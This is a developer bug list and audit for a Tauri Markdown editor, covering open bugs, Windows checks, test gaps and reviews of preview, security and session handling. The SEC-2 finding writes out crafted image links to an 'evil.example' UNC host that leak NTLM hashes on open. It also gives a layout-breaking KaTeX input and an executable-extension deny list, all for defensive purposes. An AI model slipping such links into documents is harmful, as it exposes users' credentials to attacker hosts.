# Notepadly: bug list and status

**Updated:** 19 November 2026 · **Branch:** `ccr-a918fa2a-qfstem`

**Status:**
- The first report (10 November 2026, commit `c578712`) listed 70 issues.
- Most are now fixed. The rest, the new bugs found since, the checks to do on Windows and the tests still to write are all in **Part 1**.
- Everything that is done is in **Part 2**.
- The full first report, with the original steps for every bug, is in git history (`git show 28f46c2:BUGS.md`).

**Tests:**
- `npm test`: 536 tests pass, none skipped.
- `npm run typecheck` is clean.
- The Rust code (`src-tauri`) does not build on Linux, so the Rust changes on this branch were made by careful reading and have **not been compiled or run on Windows yet**. See section 1.4.

| Mark | Meaning |
| --- | --- |
| ✅ | Reproduced by running the app or a test |
| 📖 | Found by reading the code, not run |
| ⚠️ | Needs a check in the real app on Windows |

---

# Part 1: Still to do

## 1.1 First thing: run and check the Rust changes on Windows

These were written on Linux and only type-checked, or only read. Do this before anything else, because several fixes depend on it.

1. **Run `cargo test` in `src-tauri` on Windows.** New or changed Rust tests that have never run:
   - `files.rs`:
     - Unmappable ANSI characters (C6).
     - Invalid bytes reported by the scan (C7).
     - Mixed line endings kept on save (H14; the test was `#[ignore]` before).
     - UTF-16 without BOM detected (M15; was `#[ignore]`).
     - In-place write when no temp file can be made (H15).
     - Long-path prefix (W8).
     - Note: `exclusive_lock_reports_an_error_and_keeps_the_original` needs real Windows locking.
   - `store.rs`:
     - `drafts_prune` (L16).
     - Per-window session files (`window_sessions_read` / `window_session_write` / `window_session_delete`, C5/M18).
   - `autoupdate.rs`: a downloaded update installs only when allowed (H13); `launched_hidden` only for the first window (WIN-1).
   - `lib.rs`: second launch opens a new window (F1); `tab_drop_target`; new windows sized and placed from the source window.
2. **Build the app** (`npm run app:build`) and fix any compile errors.

## 1.2 Open bugs (not fixed)

### M13. Whole-file actions fill memory on very big files 📖
- Find, Replace, Select all, Ctrl+End, Print, Save As, Go to line and changing the line ending or encoding all load the full file into RAM. There is no cancel.
- Above roughly 500 MB, `getText()` fails on the JS string limit. Printing 100 MB freezes the UI in `marked.parse`.
- **To do:** streaming Find/Print/Save As and a full load that can be cancelled, across `src/lib/loader.ts`, the engine and `src/lib/print.ts`.

### M14. Find scans the whole file on each keystroke in big files 📖
- `recount` and `firstFrom` run on the UI thread (120 ms debounce only). In a 100 MB file with few matches the UI can stall on each letter.
- **Cause:** `src/editor/find.ts`.
- **To do:** an incremental or background match count, with the result sent to the find bar when ready.

### TAB-1. Only the current Find match is shown inside a table cell 📖
- **What happens:** search a word that appears in several table cells. The current match is marked in its cell, but the other matches in tables get no highlight (matches in normal text do).
- **Cause:** `src/editor/livePreview/widgets.ts` `TableController.showSelection` marks the editor selection only. The `cm-find-match` marks of `src/editor/find.ts` cannot reach the widget's cells.
- **Fix:** pass the find query to the table widgets and mark every match in the rendered cells.

### TAB-2. Maths, images and wikilinks are not rendered in table cells (rest of L8) 📖
- `src/editor/livePreview/widgets.ts` `renderCellHtml` handles bold, italic, strike, highlight, code and links only.

### TAB-3. Emphasis rules run inside a link target in a table cell 📖
- **Steps:** a cell `[x](https://a.b/_c_/d)` or `[x](https://a.b/*c*)`.
- **Actual:** the URL in `data-href` gets `<em>` tags, so the link is broken. **Expected:** the target is left as written.
- **Cause:** `renderCellHtml` (`src/editor/livePreview/widgets.ts`) replaces emphasis before links.
- **Fix:** swap links out first, as is done for code spans.

### TAB-4. Escape in a table at the end of a partly loaded file adds a newline in the middle of the file 📖
- **Steps:** open a big file that loads in parts, where the loaded part ends inside a table. Click a cell of the last row and press Escape before the rest loads.
- **Cause:** `TableController.leave` (`src/editor/livePreview/widgets.ts`) adds a `\n` at the end of the document; the loader then appends the next chunk after it. The extra newline is saved with the next real edit.
- **Fix:** skip the newline (stay in the cell) while the tab is not fully loaded.

### FILES-1. A mixed-line-ending file cannot be normalised to its first line's style 📖
- **What happens:** the file starts with CRLF but also has LF lines. Picking "Windows (CRLF)" in the status bar does nothing (it is already shown), so the LF lines stay; since H14, a save keeps them too.
- **Workaround:** pick LF, then CRLF.
- **Cause:** `src/state/actions.ts` `changeFileFormat` returns early when the picked line ending equals `tab.eol`; the frontend does not know the file is mixed.
- **Fix:** let Rust report "mixed" in `FileChunk`, show it in the status bar, and let picking any style normalise.

### FILES-2. A UTF-16 file without a BOM gets a BOM when saved 📖
- **What happens:** since M15, such a file is read as UTF-16, but `save` always writes `Encoding::bom()`, so the first save adds `FF FE` / `FE FF`.
- **Cause:** `src-tauri/src/files.rs` `save` / `write_in_place`. The encoding enum has no "UTF-16 without BOM".
- **Fix:** probably fine as it is (Notepad also writes a BOM). Add BOM-less UTF-16 variants only if it matters.

### FILES-3. The H15 in-place save is not atomic 📖
- **What happens:** when the folder allows no new files, the file is overwritten in place. If the write fails part way (disk full, network drop), the file is damaged and no temp copy exists.
- **Cause:** `src-tauri/src/files.rs` `write_in_place`. Notepad has the same limit.

### MD-1. Maths and Mermaid inside a list, quote or callout show as source in Formatted mode 📖
- **What happens:** since L12, `$$` blocks inside a list or quote are parsed as maths, but the live preview only turns top-level blocks into widgets, so they show as styled source. Print renders them.
- The same limit applies to tables, `---` rules and Mermaid inside a list, quote or callout (from H5).
- **Cause:** `src/editor/livePreview/block.ts` builds block widgets for children of `Document` only.

### MD-2. The real regional date/time format is not available to F5 📖
- **What happens:** F5 uses the WebView's locale, which follows the Windows display language. With an English UI and a UK or German region, F5 still gives the US order.
- **Fix:** read the user's locale name in Rust (`GetUserDefaultLocaleName`) and pass it to `formatDateTime`.

### WIN-3. One file can be open in two windows (last point of M10) 📖
- **What happens:** a window does not know which files the other windows have open, so opening a file that is open in another window opens a second copy.
- This is safe: saving in one gives "changed on disk" in the other.
- **Fix:** keep a shared list of open paths in Rust, updated as tabs open and close.

### MERGE-1 (remaining risk). A brand-new draft can be pruned at start 📖
- At start, the first window deletes drafts that no stored session owns (L16).
- A window opened at start that writes a draft for a brand-new tab before that clean-up runs could still lose it. The time window is very short.
- **Fix:** run the clean-up before opening the other windows, or have Rust skip drafts newer than the start of the run.

### Smaller open points 📖
- **Lists:**
  - Enter on an empty nested list item removes the item instead of outdenting.
  - Indenting with Tab does not fix the numbering.
- **Same file, different path:** `pathsEqual` does not understand `..`, 8.3 names, or UNC vs mapped drive, so one file can open in two tabs.
- **Zoom:** Ctrl+wheel or pinch zooms 10% per event.
- **Deleted partial file:** a partly loaded file that was deleted first shows "changed" instead of "deleted" (it corrects itself within 3 seconds).
- **Read-only file:** typing works and Save says "Access is denied", with no sign beforehand.
- **Urdu / right-to-left:** table cells get no RTL alignment.
- **Early typing:** text typed in the first ~200 ms after start, before the session is restored, can be lost.

## 1.3 Remaining parts of partly fixed bugs

| # | What is still missing | Where |
| --- | --- | --- |
| H2 | Maths and Mermaid blocks can be entered only by double-click or the edit button, not with the arrow keys (tables work) | `src/editor/livePreview/widgets.ts`, `block.ts` |
| H6 | Live preview turns off for the whole document when one line is over 20,000 characters. It now comes back when the line is gone, but it should skip only that line | `src/editor/index.ts` (`checkDegrade`), live preview plugins |
| H8 | Drafts are written less often for big files, but each draft and each Save still send the whole text over IPC | `src/lib/loader.ts` |
| L5 | "characters" counts UTF-16 units, so an emoji counts as 2. A code-point count needs an incremental count per document and a Rust change in `scan()` | engine, `src-tauri/src/files.rs` |
| L11 | An unclosed `%%` restyles up to 5,000 lines, and unclosed front matter up to 1,000 lines (an unclosed `$$` is fixed) | `src/editor/markdown.ts` |
| L16 | A draft that cannot be read is deleted. `materialise` treats a read error like a missing draft. Needs a "draft unreadable" state that keeps the draft and tells the user | `src/lib/loader.ts` |
| M12 | Hibernation keeps the undo history now, but callout fold state is still reset on wake | `src/lib/loader.ts`, engine |
| M15 | No warning when a binary file is opened as text (it is damaged on save). Code pages other than 874, 932, 936, 949, 950 and 1250-1258 (for example 866) are read as windows-1252 | `src-tauri/src/files.rs` |
| W8 | Long paths are fixed. FAT/exFAT USB drives and network shares still need a check | `src-tauri/src/files.rs` |

### F2. Dragging tabs between windows: what is left
- **Undo history:** it does not move with the tab, because CodeMirror state is not serialised. The moved tab starts with an empty undo stack.
- **Single-tab window:** with one tab, the window does not follow the mouse live during the drag. On release a new window opens under the mouse and the old one closes (a short flash). Moving the window natively (`startDragging`) would lose the drop-on-another-window case.
- **Overlapping windows:** `tab_drop_target` does not know the z-order, so the first match wins.

## 1.4 To check in the real app on Windows ⚠️

### Changes made on this branch
| Area | What to check |
| --- | --- |
| C1 Save As | The Windows dialog adds the selected filter's extension itself and asks before overwriting that exact name. The fix relies on this (read in the `rfd` code, not seen). Try `LICENSE` with "All files", and `notes` with the Markdown filter |
| C6 / C7 / M15 | The "Save as UTF-8 / ANSI / Cancel" question; an ANSI file with non-ASCII bytes after 256 KB; "Reopen with encoding" |
| H15 / W8 | Save in a folder where new files cannot be created; paths over 260 characters; FAT/exFAT USB drive; network share |
| Tables (H1, M1, M2, H2, H3, M5) | A table cell copies its caret and selection into the editor through the browser's `selectionchange` event. Check Ctrl+B/I, Select All, F5, Ctrl+K, Paste and the arrow keys in cells in WebView2 |
| M7 / L14 links and images | PDFs, images and office files open in their default app (`openPath`). Programs and scripts must never be launched. `http://` images show (CSP `img-src` now allows `http:`) |
| M16 clipboard | Cut/Copy/Paste from the Edit menu, including the error message when the clipboard fails |
| F1 new window | A second launch opens a new window that gets the foreground (`AllowSetForegroundWindow`); how windows cascade near the screen edge |
| F2 tab drag | Pointer capture outside the window in WebView2, `cursor_position` on mixed-DPI monitors, dropping onto a minimised or covered window |
| C5 / M18 / M17 sessions | Several windows with unsaved tabs, then Exit, then start again: every window comes back with its own tabs and size |
| H12 | Change the theme or Recent in one window; the other window follows |
| H13 updater | Turn "Update automatically" off while an update is ready: it must not install on close |

### Suspected from the first report, never checked
| # | Suspected problem | Why |
| --- | --- | --- |
| W1 | Selected text cannot be dragged to move it inside the editor | `dragDropEnabled: true` in `tauri.conf.json`; on Windows Tauri then turns off HTML5 drag and drop |
| W2 | Edit > Paste shows a permission popup the first time, or does nothing | `navigator.clipboard.readText()`; clipboard access is not enabled |
| W3 | Right-click on a table border, maths, diagram, image or checkbox shows the WebView2 page menu ("Refresh", "Back", "Save as"). "Refresh" can drop unsaved work | `src/lib/shortcuts.ts` treats everything inside `.cm-content` as text |
| W5 | Hovering the maximize button does not show Windows 11 Snap Layouts | Custom caption buttons |
| W6 | The "Autocorrect" setting has no effect | The `autocorrect` attribute does nothing in Chromium |
| W7 | A file that is one line of several MB (minified JSON) is very slow with word wrap | CodeMirror is weak on very long lines; not measured |

## 1.5 Tests still to write

**Rust and end-to-end:**
- **Run the Rust tests on Windows** (section 1.1). They have only been type-checked.
- **End-to-end tests in a real browser or WebView** (Playwright against the Vite frontend, or WebDriver against the built app), for what jsdom cannot do:
  - Cursor movement across tables, maths and Mermaid (H2, H3, M5) with real layout.
  - Table cell selection mirroring (H1, M1, M2).
  - Dragging a tab out of the window and onto another window (F2).
  - Clipboard (M16, W2), drag and drop of text (W1), and the right-click menu (W3).

**Gaps in the current tests:**
- **M21:** the current test passes with and without the fix, so it only guards against regressions. Write one that fails without `actions.whenActivated`, by controlling the order in which the load and the activation settle.
- **Auto-updater (H13):** only the resume marker, the status wire format and the install rule are tested. The network, download and install path needs a test with a stubbed `AppHandle` and HTTP server.
- **Fake backend:** `src/test/fakeTauri.ts` still differs from Rust. It does not model UTF-16, atomic writes or `ReplaceFileW`, or keeping mixed line endings (the header lists the differences). Close these gaps, or add Rust tests for each of these cases.
- **MERGE-1:** add a test where a window writes a new draft while the first window's clean-up is running.

**For each fix in this part:**
- A test that fails before the fix and passes after: TAB-1 to TAB-4, FILES-1, MD-1, MD-2, WIN-3, M13, M14 and the rows of 1.3.

## 1.6 Recommended hardening (not a bug yet)
- **Opener permission:** `src-tauri/capabilities/default.json` gives `opener:allow-open-path` for every path (`"path": "**"`), so links to PDFs, images and office files can open in their default app.
- **What protects it now:** the frontend never sends programs or scripts to `openPath`; they open as text.
- **Recommendation:** add a deny list for executable types (`.exe`, `.bat`, `.cmd`, `.com`, `.ps1`, `.vbs`, `.js`, `.msi`, `.lnk`, `.scr`…) in the capability, so a future frontend bug cannot launch a program. Check it on Windows.
- **What the deny list does not change:** these files still open as text in Notepadly, as in Windows Notepad, through File > Open, Explorer, drag and drop, and links. The deny list only stops the app from asking Windows to *run* them with their default program.

## Review: live preview

PREV-1 to PREV-5 are fixed (see 2.3). Their tests are in `src/editor/livePreview/review.test.ts`.

### Bugs

#### PREV-6. Typing a list or quote marker at the start of a row in a table without outer pipes cuts the table ✅
- **Steps:** a table without outer pipes (`a | b` / `--|--` / `c | d` / `e | f`). Click cell `e` and type `- ` at its start, so the row becomes `- e | f`.
- **Actual:** the line now starts a list item, so the table ends above it. The cell being edited is removed from the page, focus is lost, and the next keys go nowhere. Seen in a jsdom probe: the table shrank and the cell's `isConnected` was false. `#`, `>`, `1.` and `+` do the same.
- **Expected:** the text stays in the cell.
- **Cause:** `TableController.writeCell` (`src/editor/livePreview/widgets.ts`) writes the cell text as it is. For the first cell of a row with no leading `|`, that text is also the start of the line.
- **Fix:** when the first cell of a row without a leading pipe is written, rewrite the row with `formatRow` (this adds the pipes), or escape a leading block marker (`\-`, `\#`, `\>`).

#### PREV-7. Relative images stay broken after the first save or Save As to another folder 📖
- **Steps:** paste `![](pic.png)` into a new untitled tab, then save it next to `pic.png`. Or use Save As to move a note to another folder.
- **Actual:** the image stays broken, or keeps showing the old folder's file, until the line scrolls out of view and back, or is edited.
- **Cause:** `ImageWidget.toDOM` (`src/editor/livePreview/widgets.ts`) resolves the path once through `previewContext.baseDir()`. `ImageWidget.eq` compares the raw `src` only, so CodeMirror keeps the old `<img>`. Nothing tells the editor that the tab's path changed: `src/editor/api.ts` has no such hook, and `EditorEngine` never redraws on a rename.
- **Fix:** add an `engine.pathChanged(tabId)` call from the save and rename actions that dispatches an effect. Let the inline plugin rebuild on that effect, and store the resolved src in the widget so `eq` sees the change.

#### PREV-8. A leading-slash image path resolves against the document folder, but a leading-slash link resolves against the drive root ✅
- **Steps:** a document in `C:\docs` with `![](/img/a.png)` and `[x](/img/a.md)`.
- **Actual:** the image loads `C:\docs\\img\a.png`, but Ctrl+click on the link opens `C:\img\a.md`.
- **Cause:** `joinBase` in `src/editor/livePreview/context.ts` joins any non-absolute path to the base. `classifyHref` in `src/state/logic.ts` uses `rootOf(baseDir)`.
- **Fix:** pick one rule (the drive or share root, as for links) and use it in both places.

#### PREV-9. Print still loads images from another computer's share 📖 — fixed in the merge of the security review (shares the PREV-3 check)
- This is the same problem as PREV-3, which is fixed for the live preview only.
- **Cause:** `safeImageSrc` in `src/lib/print.ts` passes `file://server/...` and `\\server\...` to `convertFileSrc`. Printing a downloaded note then sends the user's NTLM credentials to that server.
- **Fix:** move `networkHost` from `context.ts` to `src/state/logic.ts`, and apply the same rule in `print.ts`.

#### PREV-10. A link in a table cell whose URL has parentheses is cut short ✅
- **Steps:** a cell `[w](https://en.wikipedia.org/wiki/Foo_(bar))`.
- **Actual:** `data-href` is `https://en.wikipedia.org/wiki/Foo_(bar`, and a stray `)` shows after the link. Outside tables, the same link works.
- **Cause:** the link regex in `renderCellHtml` (`src/editor/livePreview/widgets.ts`) is `\(([^)\s]+)\)`.
- **Fix:** allow one level of balanced parentheses: `\(((?:[^()\s]|\([^()\s]*\))+)\)`. This is best done together with TAB-3, by taking links out before the emphasis rules.

### Improvements
- **Typing speed in large tables:**
  - Measured in jsdom: a keystroke in a cell of a 3,000-row table takes about 80 ms. Building the table takes about 0.8 s.
  - `TableController.render` walks every cell (`querySelectorAll` plus `dataset` reads), and `parseTable` runs about 5 times per keystroke (`render`, `writeCell`, `syncSelection`, `bodyRows`, `columns`).
  - **Suggestion:** cache the parsed rows per `source`, and re-render only the rows whose text changed. The whole table is also in the DOM even when off screen; consider rendering only the visible rows for very large tables.
- **KaTeX limits:** `renderMath` (`src/editor/lazy.ts`) sets no `maxSize`. `\rule{99999em}{99999em}` builds an enormous box that breaks the layout. Set `maxSize: 100` (em) and keep `maxExpand` at its default.
- **Widget offsets:** `MathWidget.eq` and `MermaidWidget.eq` ignore `sourceOffset`. After a change such as editing `` ```mermaid `` to `` ``` mermaid ``, the old DOM is kept, and double-click puts the cursor at the old offset (one character off). Compare `sourceOffset` in `eq`.
- **Images in untitled tabs:** with no folder, `resolveImageSrc("pic.png")` gives the bare relative path. The asset protocol then reads it relative to the app's working folder. Return `""` when there is no base.
- **Failed Mermaid renders are not cached:** a broken diagram is parsed again each time its widget is re-created, for example on scroll. Cache the error text too (keyed like the SVG).
- **Test gaps:**
  - IME composition inside a cell. CodeMirror ignores the composition events because `TableWidget.ignoreEvent` returns true, and `render` leaves the active cell's DOM alone while its text matches. This was checked by reading only, so it needs a WebView2 check with the Urdu and Chinese IMEs.
  - A cell being edited while an external reload (`resetDoc`) or Replace All changes the table. Both were checked by reading only: focus is lost on reload, which is acceptable.

## Review: security and configuration

Threat model: the user opens an untrusted Markdown or text file. Checked: HTML, KaTeX, Mermaid and the print sanitiser, links and the opener, images and the CSP, paths in links, drafts and session keys, the IPC commands, the updater, the installer hooks, CI, and the dependencies.

**Result:** a crafted document cannot run script. The CSP has `script-src 'self'` with no inline scripts. Live preview never renders raw HTML. Table cells allow only attribute-free tags. KaTeX runs with `trust: false` and Mermaid with `securityLevel: "strict"`. Print uses an allow-list inside an inert `<template>`. Links never navigate the webview. Draft ids and session keys are checked in Rust (`store.rs` `check_id`). `npm audit` finds nothing. `cargo audit` finds no vulnerabilities, only "unmaintained" warnings on Linux-only crates (glib, zbus) and on chrono and proc-macro-error. The updater checks the minisign signature over HTTPS, and Tauri only installs a newer version.

### Bugs

#### SEC-2. Opening a document makes Windows send the user's NTLM hash to any server the document names 📖 — images fixed (PREV-3 for the editor, PREV-9 for print); links still open by click
- **Input:** a `.md` file containing `![](\\evil.example\s\x.png)`, `![](file://evil.example/s/x.png)` or `![[\\evil.example\s\x.png]]`, opened in Formatted mode (the default for `.md`). Printing such a file does the same for `<img src="\\evil.example\...">`.
- **Actual:** the image is requested as soon as it is shown. Nothing has to be clicked.
  - `resolveImageSrc` (`src/editor/livePreview/context.ts:41`, `joinBase` accepts `\\` paths) and `safeImageSrc` (`src/lib/print.ts:36`) pass the UNC path to `convertFileSrc`.
  - The asset protocol (scope `"**"` in `tauri.conf.json`) then canonicalises and opens it.
  - Windows connects to the host over SMB, or WebDAV over port 80 when SMB is blocked, and sends the user's NTLMv2 hash. This is a well-known credential-leak class.
  - Clicking a link to `\\host\...` does the same, but needs a click.
- **Expected:** a document can load images only from local drives and from the network host the document itself is on.
- **Tests:** "SEC-2: ..." in `src/editor/livePreview/livePreview.test.ts` and `src/lib/print.test.ts` now run and pass (`mayLoadImageFrom` in `src/editor/livePreview/context.ts`, used by the preview and by print).
- **Still open:** a click on a link to `\\host\...` still reaches that host; a "click to load" for blocked images is not done.
- **Suggested fix:**
  - In `resolveImageSrc` and `safeImageSrc`, refuse an absolute UNC path or `file://host/` whose host differs from the host of the document's own folder (`baseDir`). Show the image placeholder with "Blocked: network image" and a click to load it.
  - Refuse `\\?\` and `\\.\` (device) paths outright.
  - Not fixed here because it changes behaviour for notes that embed images from another share; the owner should decide.

### Improvements
- **Remote images (privacy):** `http:`/`https:` images load as soon as a file opens, so a document can tell its sender when and from which IP it was read. Consider a setting "Load remote images" (on, or "ask per document" as mail clients do). `img-src ... http:` in the CSP also allows plain-HTTP tracking.
- **Asset protocol scope `"**"`** (`tauri.conf.json`): any local file can be loaded as an image or media by the page. This is harmless while no script can run, but it is wider than needed. A deny list for `\\?\`, `\\.\` and the app's own data folder would limit the damage if script injection is ever found.
- **Capabilities wider than needed** (`src-tauri/capabilities/default.json`): the frontend does not appear to call `hide`, `set-effects`, `set-background-color`, `set-webview-background-color`, `set-app-theme`, `set-title`, `is-visible` or `is-minimized` (grep of `src/`). Remove them after a check on Windows. Some may be used by Tauri's own drag region or theme code.
- **CI supply chain:** third-party actions are pinned to moving tags (`tauri-apps/tauri-action@v0`, `swatinem/rust-cache@v2`, `dtolnay/rust-toolchain@stable`). `release.yml` runs with `contents: write` and the updater signing key, so pin these to commit SHAs and let Dependabot update them.
- **CI audit:** add `npm audit --omit=dev` and `cargo audit` (or `cargo deny`) jobs.
- **Legacy Office types:** `EXTERNAL_EXTENSIONS` (`src/state/logic.ts`) sends `.doc`, `.xls` and `.ppt` (formats that can hold macros) to their default app. With a UNC path (SEC-2) such a file can come straight from a remote server. Fixing SEC-2 for links too (same-host rule) covers this.
- **WebView2 flag:** `additionalBrowserArgs` turns off `msSmartScreenProtection`. This is fine while the webview never navigates, but add a comment saying why, so it is not copied to a setup that does navigate.

## Review: state and file lifecycle

STATE-1 to STATE-4 are fixed (see 2.3). Tests: `src/state/lifecycle.test.ts`.

### Bugs

#### STATE-5. A tab move that times out leaves the tab in both windows, sharing one draft 📖
- **Steps:** drag a dirty tab to a new window on a slow or busy PC, so the new window confirms after 10 s (or its `tab-received` emit fails, which is only logged).
- **Actual:** the source shows "did not take the tab, so it stays here" and keeps it; the target has taken it too. Both tabs have the same id, so both own draft `<id>`. Closing the tab in one window with "Don't save", or saving it, deletes that draft (`disposeTab`, `src/lib/loader.ts:677`; flush delete). The other window's session still says `hasDraft`, so on the next start its unsaved text is gone (`materialise` finds no draft and loads the file).
- **Expected:** a tab lives in one window only, or the copies are independent.
- **Cause:** `src/state/actions.ts` `waitForReceipt` (timeout, `MOVE_TIMEOUT_MS`) has no way to take the tab back from the target; `receiveTab` answers but never learns the source gave up.
- **Fix:** the target asks "may I keep it?" and the source answers yes only if it has not timed out (two-step handshake), or the target gives the received tab a new id and writes its own draft at once.

#### STATE-6. A moved tab loses its runtime state 📖
- `handOff`/`takeOver` (`src/lib/loader.ts:692`, `:709`) carry text, snapshot, draft and `forceDirty` only. Lost: `dismissed`, `eolChosen`, `cleanDelete`, `unreadable`, `sleep`.
- **Effects:**
  - Keep mine on a changed file, then move the tab: the "changed on disk" bar comes back in the new window.
  - A line ending picked for a mixed-ending file (H14/FILES-1) is not applied on save after the move: `normalizeEol` is false again. Same after a restart, since the session does not store `eolChosen`.
  - H7 after a move: a clean tab flagged deleted stays unsaved when the file comes back.
- **Fix:** add these fields to `TabHandoff` (and `eolChosen` to `SessionTab`).

#### STATE-7. Right after a move, a crash can lose the moved tab's unsaved text 📖
- `receiveTab` (`src/state/actions.ts`) confirms the move before the target stores its session (`takeOver` only schedules it, 800 ms or more). The source then removes the tab and writes a session without it.
- If the target window or the app dies within that pause, no stored session lists the tab, and the next start's `pruneDrafts` deletes its draft.
- The other way round, a crash of the source before its flush leaves the tab in both stored sessions (duplicate on restart).
- **Fix:** in `receiveTab`, write the target's session (`flushPersistence`) before `answer()`; flush the source's session right after `removeFromList(id, true)`.

#### STATE-8. Closing two windows at once asks about every unsaved tab and drops both sessions 📖
- **Steps:** "continue previous session" on, two windows with unsaved tabs, taskbar > "Close all windows".
- **Actual:** each window calls `ipc.isLastWindow()` (`src/state/actions.ts:681`) while the other is still on screen, so both take the "not last" path: they ask "save changes?" for each tab and delete their sessions. **Expected (WIN-2):** the last window keeps its tabs as drafts without asking.
- **Fix:** let Rust decide "last" atomically (count windows that have started closing), or treat a close that arrives within a short time of another window's close as an exit.

#### STATE-9. Saving a partly loaded file that was deleted says "changed by another program" 📖
- **Steps:** open a file over 2 MB (partly loaded), delete it in Explorer, poll flags "deleted", edit, press Ctrl+S.
- **Actual:** `doWrite` sends the old stamp (`src/lib/loader.ts:575`, a partial tab keeps it), Rust answers STALE, and `writeAndReport` (`src/state/actions.ts`) sets `externalChange: "modified"` over "deleted" and shows "This file was changed by another program". **Expected:** a message that the file was deleted and only the loaded part can be saved (Save As, C3 path).

### Improvements
- **Save As re-reads the tab after the dialog:** `saveAs` (`src/state/actions.ts`) keeps the `tab` from before the native dialog. If the tab was closed or renamed meanwhile, `writeTab` makes a new runtime entry via `rtOf` (leak) and reports "The tab was closed". Check `getTab(id)` after the dialog and stop quietly.
- **Closing waits for the draft queue:** since STATE-2, `discardCurrentSession` waits for a running flush. A draft write that never returns would block the close; add a timeout.
- **Moved untouched tab with a stale draft:** a tab saved and moved before its draft was deleted keeps `hasDraft` in the target but is never queued for deletion there; only the next start's prune removes the file. `takeOver` could call `markDraftChanged` whenever `hasDraft` is set.
- **Test gap:** two windows cannot run in one Vitest module graph (`bootApp` resets modules), so STATE-5/7/8 are traced, not tested. A harness with two loader instances over one `fakeTauri` backend would cover moves and simultaneous closes.

---

# Part 2: Done

## 2.1 Decisions confirmed by the owner
- **WIN-2:** with "Continue previous session", closing one of several windows asks "save changes?" for its unsaved tabs and removes its session, as in Windows Notepad. The last window, and every window on File > Exit, keep their tabs as drafts without asking. Confirmed as the intended behaviour on 19 November 2026.

## 2.2 Bugs from the first report that are fixed

"Part" means the rest is listed in Part 1.3.

### Critical
| # | Bug | What was fixed | Commit |
| --- | --- | --- | --- |
| C1 | Save As without an extension overwrote another file | Save As uses the path the dialog returns (the dialog already adds the selected filter's extension and checks that exact name), so `LICENSE` with "All files" stays `LICENSE`. ⚠️ see 1.4 | `965dcfc` |
| C2 | Replace all during loading changed only the loaded part | Replace and Replace all wait for the whole file and are disabled while it loads | `2f064ce` |
| C3 | Edits in a partly loaded file could not be saved once it changed on disk | Save As asks to save the loaded part (with the edits) to the new file; the tab then becomes that complete file | `246833d` |
| C4 | A message over the "save changes?" dialog left the tab and window unable to close | `showMessage` answers a pending "save changes?" dialog as Cancel before replacing it | `d510cf2` |
| C5 | The session did not come back if the main window closed first | Every window stores its own session (`sessions/<key>.json`) and drafts; the first window restores one and opens a window for each other one | `cb1f8a5` |
| C6 | Urdu/Unicode saved in an ANSI file became `?` | Rust refuses the save (`UNMAPPABLE`); the app asks Save as UTF-8 / Save as ANSI (with `?`) / Cancel | `529593f`, `a7319a4` |
| C7 | Encoding was detected from the first 256 KB only | The background scan reports bytes not valid in the encoding; an unedited UTF-8 tab is read again as ANSI, an edited one gets a warning | `529593f`, `a7319a4` |
| C8 | Typing went into the previous tab while a tab loaded | While a tab loads, the editor shows an empty read-only placeholder | `e641629` |

### High
| # | Bug | What was fixed | Commit |
| --- | --- | --- | --- |
| H1 | Ctrl+B / Ctrl+I in a table cell made `****text` | A table cell copies its caret into the editor selection, so Ctrl+B/I and the toolbar wrap the selected cell text | `1887e02` |
| H2 (part) | Left/Right got stuck at tables, maths and diagrams | Rendered blocks are atomic ranges; an arrow key that lands on a table's edge enters the table | `1887e02` |
| H3 | Table at the top: Up then typing scattered the text | Up in the header of a table at the top of the document stays in the cell | `1887e02` |
| H4 | Inserting a table on an empty line swallowed the paragraph below | A blank line is kept after the table | `d573f19` |
| H5 | Table commands corrupted a table inside a blockquote or callout | Table commands and Tab keep each row's `> ` prefix and indentation | `f551dc0` |
| H6 (part) | One long line turned live preview off for good | Preview comes back once no long line is left; the status bar says "Formatted (preview off)" with the reason | `0bb62e7` |
| H7 | A deleted-then-recreated file made a clean tab "unsaved" | A clean tab whose file comes back before any edit is clean again, and reloads if the content changed | `d8a8ef6` |
| H8 (part) | The whole document was written to the draft after every pause | The draft wait grows with the document (800 ms up to 1 MB, about +2 s per MB, max 30 s; a draft is never older than 60 s) | `1123dea` |
| H9 | Print did not match the screen, and comments were printed | `%%comments%%` and front matter are left out; maths (KaTeX), Mermaid, callouts, highlights, wikilinks, embeds and tags are rendered | `ccacdde`, `f2a908b` |
| H10 | The Find "x of y" counter was wrong | Next/Previous report the real index; F3 / Shift+F3 and Edit > Find next/previous go through the find bar; "N of 10,000+" past the limit | `96a6e76`, `7ff58db` |
| H11 | Find matches inside tables, maths and Mermaid could not be seen | A match in a table cell is marked in the cell; one in block maths or Mermaid opens its source (other matches in cells: TAB-1) | `1887e02` |
| H12 | Settings and Recent were not shared between windows | Windows listen for `storage` events; each write merges only that window's own changes | `dd7e4c3` |
| H13 | Turning off auto-update did not stop a downloaded update | A downloaded update installs only while "Update automatically" is on, or after "Check for updates" was pressed | `3f47212` |
| H14 | A file with mixed line endings was fully rewritten on save | Unchanged lines keep their own ending; picking a line ending in the status bar still converts every line | `529593f`, `a7319a4` |
| H15 | Save failed in a folder where new files cannot be created | The file is written in place when no temp file can be made. ⚠️ see 1.4; not atomic (FILES-3) | `529593f` |
| H16 | A file deleted while the app was closed came back as an empty "unsaved" tab | The tab stays clean with the "deleted" bar; Save does not write an empty file | `3463b7a` |

### Medium
| # | Bug | What was fixed | Commit |
| --- | --- | --- | --- |
| M1 | Ctrl+A in a table cell selected the whole document | Select All in a cell selects the cell's text | `1887e02` |
| M2 | F5, Ctrl+K and Paste in a cell inserted at the start of the cell | They insert at the cell caret (escaped so they cannot split the row); Copy/Cut see the cell selection | `1887e02` |
| M3 | After Ctrl+M the Tab key left the editor | Ctrl+M (tab focus mode) is removed from the editor keymap | `05bdd86` |
| M4 | Heading and Bold made wrong Markdown on several lines | Headings skip blank lines; Bold/Italic/Strike wrap each paragraph separately | `d573f19`, `e68b4e5` |
| M5 | Moving down out of the last table row marked the document unsaved | Down stays in the cell; Escape adds the line outside the undo history | `1887e02` |
| M6 | Save As onto another open tab's path gave two tabs for one file | That tab closes if clean; if it has unsaved changes the save is refused with a message | `246833d` |
| M7 | Links opened wrongly | `[[v1.2 notes]]`, `%23`/`%26`, `file://`, folder links and root-relative `/docs/a.md` work; PDFs, images and office files open in their default app | `ebb2058` |
| M8 | `.mdx` was plain text in the app | `.mdx` is Markdown, also in the Open/Save filters | `ebb2058` |
| M9 | A file opened during startup could be lost | Listeners are registered before the start-up files are taken | `cb1f8a5` |
| M10 (part) | Odd results with "Open in a new window" | A second launch's files go to the last focused window only; an empty window takes the file; links open in their own window | `cb1f8a5` |
